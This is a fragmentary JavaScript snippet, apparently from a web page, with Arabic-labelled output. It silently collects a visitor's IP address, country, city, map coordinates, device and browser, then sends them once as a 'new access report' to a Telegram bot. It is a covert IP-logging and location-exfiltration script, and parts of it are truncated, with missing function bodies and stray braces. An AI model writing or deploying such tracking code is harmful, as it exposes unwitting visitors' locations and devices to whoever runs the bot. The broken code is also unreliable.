    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {

    function getIPInfo() {

    async function runReportOnce() {
      if (sentOnce) return;
      sentOnce = true;
      let report = "🛑 تقرير دخول جديد:\n\n";
      try {
        const data = await getIPInfo();
        report += `🌐 IP: ${data.ip}\n📍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}\n🌎 إحداثيات: ${data.loc}\n🛰️ https://www.google.com/maps?q=${data.loc}\n\n`;
      } catch {
        report += "🌐 IP: ❌ فشل جلب البيانات\n\n";
      }

      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;
      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون\n";
      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز\n";
      else report += "🌀 الجهاز: غير معروف\n";

      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome\n";
      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox\n";
      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari\n";
      else report += "🌐 المتصفح: غير معروف\n";

      sendToTelegram(report);
    }

      });
